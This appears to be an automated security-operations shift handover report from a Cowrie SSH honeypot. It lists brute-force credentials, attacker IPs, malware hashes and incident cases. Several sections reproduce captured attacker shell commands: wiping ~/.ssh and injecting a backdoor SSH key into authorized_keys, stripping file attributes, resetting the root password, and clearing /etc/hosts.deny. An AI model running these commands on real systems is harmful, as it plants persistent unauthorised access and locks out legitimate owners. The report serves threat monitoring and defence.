# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-03-23 |
| **Generated At** | 2026-03-23T22:30:16Z |
| **Shift Time** | 22:30 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **58** |
| Confirmed Threats | **53** |
| False Positives Filtered | **5** (8.6%) |
| Unique Attacker IPs | **24** |
| Countries of Origin | **14** |
| High Severity Cases | **9** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **49** |
| Malware Samples Analyzed | **0** HIGH · **6** MED · 1 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **43** |
| Unique Credential Pairs | **38** |
| Unique Usernames | **19** |
| Unique Passwords | **34** |
| Successful Auth Pairs | **9** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `ubuntu` | 14 |
| `root` | 10 |
| `345gs5662d34` | 2 |
| `waf` | 2 |
| `postgres` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `12345678` | 3 |
| `12345` | 3 |
| `345gs5662d34` | 2 |
| `3245gs5662d34` | 2 |
| `ubuntu` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `3245gs5662d34` | 2 |
| `root` | `ubuntu` | 2 |
| `waf` | `waf` | 2 |
| `root` | `!1q2w3e4r` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qwerty` | `122.187.227.144` | 2026-03-23T20:41:39 |
| `root` | `admin` | `80.67.172.162` | 2026-03-23T20:51:07 |
| `root` | `zxc123321` | `103.67.78.132` | 2026-03-23T20:56:32 |
| `root` | `3245gs5662d34` | `103.67.78.132` | 2026-03-23T20:56:38 |
| `root` | `ubuntu` | `196.188.93.169` | 2026-03-23T20:59:39 |
| `root` | `ubuntu` | `103.48.161.42` | 2026-03-23T20:59:52 |
| `root` | `!1q2w3e4r` | `205.254.166.124` | 2026-03-23T21:08:14 |
| `root` | `3245gs5662d34` | `205.254.166.124` | 2026-03-23T21:08:16 |
| `root` | `!1q2w3e4r` | `120.48.168.33` | 2026-03-23T21:11:54 |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:bC6X1RLWQYYC"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `120.48.168.33`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `205.254.166.124`, `103.67.78.132`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **24** |
| Unique ASNs | **21** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS9498` | BHARTI Airtel Ltd. | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS10439` | CariNet, Inc. | 1 | HIGH |
| `AS133982` | Excitel Broadband Private Limited | 1 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 1 | LOW |
| `AS136052` | PT Cloud Hosting Indonesia | 1 | HIGH |
| `AS7713` | PT Telekomunikasi Indonesia | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (9)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a6d8ebaad4cd

| Field | Detail |
|---|---|
| **Source IP** | `122.187.227[.]144` |
| **First Seen** | 2026-03-23 20:41 |
| **Last Seen** | 2026-03-23 20:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 20:41:37` | `cowrie.session.connect` |
| `2026-03-23 20:41:38` | `cowrie.client.version` |
| `2026-03-23 20:41:38` | `cowrie.client.kex` |
| `2026-03-23 20:41:39` | `cowrie.login.success` |
| `2026-03-23 20:41:40` | `cowrie.direct-tcpip.request` |
| `2026-03-23 20:41:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.227[.]144` to AbuseIPDB if not already reported
- [ ] Block `122.187.227[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-267165a83033

| Field | Detail |
|---|---|
| **Source IP** | `80.67.172[.]162` |
| **First Seen** | 2026-03-23 20:51 |
| **Last Seen** | 2026-03-23 20:51 |
| **Session Duration** | 10s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 20:51:05` | `cowrie.session.connect` |
| `2026-03-23 20:51:05` | `cowrie.client.version` |
| `2026-03-23 20:51:05` | `cowrie.client.kex` |
| `2026-03-23 20:51:07` | `cowrie.client.fingerprint` |
| `2026-03-23 20:51:07` | `cowrie.login.failed` |
| `2026-03-23 20:51:07` | `cowrie.login.success` |
| `2026-03-23 20:51:15` | `cowrie.direct-tcpip.request` |
| `2026-03-23 20:51:15` | `cowrie.direct-tcpip.ja4` |
| `2026-03-23 20:51:15` | `cowrie.direct-tcpip.data` |
| `2026-03-23 20:51:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.67.172[.]162` to AbuseIPDB if not already reported
- [ ] Block `80.67.172[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-935a1ea31cc2

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]132` |
| **First Seen** | 2026-03-23 20:56 |
| **Last Seen** | 2026-03-23 20:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 20:56:31` | `cowrie.session.connect` |
| `2026-03-23 20:56:31` | `cowrie.client.version` |
| `2026-03-23 20:56:31` | `cowrie.client.kex` |
| `2026-03-23 20:56:32` | `cowrie.login.success` |
| `2026-03-23 20:56:33` | `cowrie.session.params` |
| `2026-03-23 20:56:33` | `cowrie.command.input` |
| `2026-03-23 20:56:33` | `cowrie.command.failed` |
| `2026-03-23 20:56:33` | `cowrie.log.closed` |
| `2026-03-23 20:56:34` | `cowrie.session.params` |
| `2026-03-23 20:56:34` | `cowrie.command.input` |
| `2026-03-23 20:56:34` | `cowrie.session.file_download` |
| `2026-03-23 20:56:34` | `cowrie.log.closed` |
| `2026-03-23 20:56:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d23b5b99b115

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]132` |
| **First Seen** | 2026-03-23 20:56 |
| **Last Seen** | 2026-03-23 20:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 20:56:37` | `cowrie.session.connect` |
| `2026-03-23 20:56:37` | `cowrie.client.version` |
| `2026-03-23 20:56:37` | `cowrie.client.kex` |
| `2026-03-23 20:56:38` | `cowrie.login.success` |
| `2026-03-23 20:56:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]132` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db92987197aa

| Field | Detail |
|---|---|
| **Source IP** | `196.188.93[.]169` |
| **First Seen** | 2026-03-23 20:59 |
| **Last Seen** | 2026-03-23 20:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 20:59:37` | `cowrie.session.connect` |
| `2026-03-23 20:59:37` | `cowrie.client.version` |
| `2026-03-23 20:59:37` | `cowrie.client.kex` |
| `2026-03-23 20:59:39` | `cowrie.login.success` |
| `2026-03-23 20:59:40` | `cowrie.direct-tcpip.request` |
| `2026-03-23 20:59:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.93[.]169` to AbuseIPDB if not already reported
- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5603c7651c25

| Field | Detail |
|---|---|
| **Source IP** | `103.48.161[.]42` |
| **First Seen** | 2026-03-23 20:59 |
| **Last Seen** | 2026-03-23 20:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 20:59:50` | `cowrie.session.connect` |
| `2026-03-23 20:59:51` | `cowrie.client.version` |
| `2026-03-23 20:59:51` | `cowrie.client.kex` |
| `2026-03-23 20:59:52` | `cowrie.login.success` |
| `2026-03-23 20:59:53` | `cowrie.direct-tcpip.request` |
| `2026-03-23 20:59:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.48.161[.]42` to AbuseIPDB if not already reported
- [ ] Block `103.48.161[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af034abe22dd

| Field | Detail |
|---|---|
| **Source IP** | `205.254.166[.]124` |
| **First Seen** | 2026-03-23 21:08 |
| **Last Seen** | 2026-03-23 21:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 21:08:14` | `cowrie.session.connect` |
| `2026-03-23 21:08:14` | `cowrie.client.version` |
| `2026-03-23 21:08:14` | `cowrie.client.kex` |
| `2026-03-23 21:08:14` | `cowrie.login.success` |
| `2026-03-23 21:08:14` | `cowrie.session.params` |
| `2026-03-23 21:08:14` | `cowrie.command.input` |
| `2026-03-23 21:08:14` | `cowrie.command.failed` |
| `2026-03-23 21:08:14` | `cowrie.log.closed` |
| `2026-03-23 21:08:15` | `cowrie.session.params` |
| `2026-03-23 21:08:15` | `cowrie.command.input` |
| `2026-03-23 21:08:15` | `cowrie.session.file_download` |
| `2026-03-23 21:08:15` | `cowrie.log.closed` |
| `2026-03-23 21:08:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `205.254.166[.]124` to AbuseIPDB if not already reported
- [ ] Block `205.254.166[.]124` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8bb7449a9ad

| Field | Detail |
|---|---|
| **Source IP** | `205.254.166[.]124` |
| **First Seen** | 2026-03-23 21:08 |
| **Last Seen** | 2026-03-23 21:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 21:08:16` | `cowrie.session.connect` |
| `2026-03-23 21:08:16` | `cowrie.client.version` |
| `2026-03-23 21:08:16` | `cowrie.client.kex` |
| `2026-03-23 21:08:16` | `cowrie.login.success` |
| `2026-03-23 21:08:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `205.254.166[.]124` to AbuseIPDB if not already reported
- [ ] Block `205.254.166[.]124` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8bc6e9749a1

| Field | Detail |
|---|---|
| **Source IP** | `120.48.168[.]33` |
| **First Seen** | 2026-03-23 21:11 |
| **Last Seen** | 2026-03-23 21:12 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:bC6X1RLWQYYC"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-23 21:11:53` | `cowrie.session.connect` |
| `2026-03-23 21:11:53` | `cowrie.client.version` |
| `2026-03-23 21:11:53` | `cowrie.client.kex` |
| `2026-03-23 21:11:54` | `cowrie.login.success` |
| `2026-03-23 21:11:54` | `cowrie.session.params` |
| `2026-03-23 21:11:54` | `cowrie.command.input` |
| `2026-03-23 21:11:54` | `cowrie.command.failed` |
| `2026-03-23 21:11:54` | `cowrie.log.closed` |
| `2026-03-23 21:11:55` | `cowrie.session.params` |
| `2026-03-23 21:11:55` | `cowrie.command.input` |
| `2026-03-23 21:11:55` | `cowrie.session.file_download` |
| `2026-03-23 21:11:55` | `cowrie.log.closed` |
| `2026-03-23 21:12:07` | `cowrie.session.params` |
| `2026-03-23 21:12:07` | `cowrie.command.input` |
| `2026-03-23 21:12:07` | `cowrie.log.closed` |
| `2026-03-23 21:12:08` | `cowrie.session.params` |
| `2026-03-23 21:12:08` | `cowrie.command.input` |
| `2026-03-23 21:12:08` | `cowrie.log.closed` |
| `2026-03-23 21:12:09` | `cowrie.session.params` |
| `2026-03-23 21:12:09` | `cowrie.command.input` |
| `2026-03-23 21:12:09` | `cowrie.session.file_download` |
| `2026-03-23 21:12:09` | `cowrie.log.closed` |
| `2026-03-23 21:12:09` | `cowrie.session.params` |
| `2026-03-23 21:12:09` | `cowrie.command.input` |
| `2026-03-23 21:12:09` | `cowrie.log.closed` |
| `2026-03-23 21:12:10` | `cowrie.session.params` |
| `2026-03-23 21:12:10` | `cowrie.command.input` |
| `2026-03-23 21:12:11` | `cowrie.log.closed` |
| `2026-03-23 21:12:11` | `cowrie.session.params` |
| `2026-03-23 21:12:11` | `cowrie.command.input` |
| `2026-03-23 21:12:11` | `cowrie.command.input` |
| `2026-03-23 21:12:12` | `cowrie.log.closed` |
| `2026-03-23 21:12:12` | `cowrie.session.params` |
| `2026-03-23 21:12:12` | `cowrie.command.input` |
| `2026-03-23 21:12:12` | `cowrie.log.closed` |
| `2026-03-23 21:12:13` | `cowrie.session.params` |
| `2026-03-23 21:12:13` | `cowrie.command.input` |
| `2026-03-23 21:12:13` | `cowrie.log.closed` |
| `2026-03-23 21:12:13` | `cowrie.session.params` |
| `2026-03-23 21:12:13` | `cowrie.command.input` |
| `2026-03-23 21:12:14` | `cowrie.log.closed` |
| `2026-03-23 21:12:14` | `cowrie.session.params` |
| `2026-03-23 21:12:14` | `cowrie.command.input` |
| `2026-03-23 21:12:14` | `cowrie.log.closed` |
| `2026-03-23 21:12:15` | `cowrie.session.params` |
| `2026-03-23 21:12:15` | `cowrie.command.input` |
| `2026-03-23 21:12:15` | `cowrie.log.closed` |
| `2026-03-23 21:12:15` | `cowrie.session.params` |
| `2026-03-23 21:12:15` | `cowrie.command.input` |
| `2026-03-23 21:12:16` | `cowrie.log.closed` |
| `2026-03-23 21:12:16` | `cowrie.session.params` |
| `2026-03-23 21:12:16` | `cowrie.command.input` |
| `2026-03-23 21:12:17` | `cowrie.log.closed` |
| `2026-03-23 21:12:17` | `cowrie.session.params` |
| `2026-03-23 21:12:17` | `cowrie.command.input` |
| `2026-03-23 21:12:18` | `cowrie.log.closed` |
| `2026-03-23 21:12:18` | `cowrie.session.params` |
| `2026-03-23 21:12:18` | `cowrie.command.input` |
| `2026-03-23 21:12:19` | `cowrie.log.closed` |
| `2026-03-23 21:12:19` | `cowrie.session.params` |
| `2026-03-23 21:12:19` | `cowrie.command.input` |
| `2026-03-23 21:12:19` | `cowrie.log.closed` |
| `2026-03-23 21:12:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.168[.]33` to AbuseIPDB if not already reported
- [ ] Block `120.48.168[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `183.81.33[.]183` | **14** | 2026-03-23 20:42 | 2026-03-23 22:28 | 6m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.48.168[.]33` | **12** | 2026-03-23 20:55 | 2026-03-23 21:14 | 17m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `205.254.166[.]124` | **5** | 2026-03-23 20:57 | 2026-03-23 21:15 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `135.237.127[.]71` | **2** | 2026-03-23 22:27 | 2026-03-23 22:27 | 0m | 0 | `T1592` | 🟢 LOW |
| `102.38.3[.]107` | 1 | 2026-03-23 20:48 | 2026-03-23 20:48 | 9s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.67.78[.]132` | 1 | 2026-03-23 20:56 | 2026-03-23 20:56 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `117.251.207[.]153` | 1 | 2026-03-23 21:43 | 2026-03-23 21:43 | 13s | 0 | `T1592` | 🟢 LOW |
| `180.76.52[.]146` | 1 | 2026-03-23 22:19 | 2026-03-23 22:19 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `182.95.42[.]90` | 1 | 2026-03-23 22:16 | 2026-03-23 22:16 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `221.10.221[.]104` | 1 | 2026-03-23 22:01 | 2026-03-23 22:01 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `31.208.54[.]221` | 1 | 2026-03-23 21:21 | 2026-03-23 21:21 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.92.35[.]211` | 1 | 2026-03-23 20:43 | 2026-03-23 20:43 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.182.5[.]98` | 1 | 2026-03-23 22:14 | 2026-03-23 22:14 | 6s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `65.20.251[.]41` | 1 | 2026-03-23 21:06 | 2026-03-23 21:06 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `71.6.232[.]28` | 1 | 2026-03-23 21:00 | 2026-03-23 21:01 | 7s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (11 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **28/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **46/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `205.254.166[.]124` | IN | Cogent Communications, LLC | **100** ⚠️ | 0 |
| `183.81.33[.]183` | VN | FPT Telecom Company | **100** ⚠️ | 50 |
| `180.76.52[.]146` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 10 |
| `103.48.161[.]42` | BD | The Eastern Pickle Company Limited | **100** ⚠️ | 23 |
| `135.237.127[.]71` | US | Microsoft Limited | **100** ⚠️ | 50 |
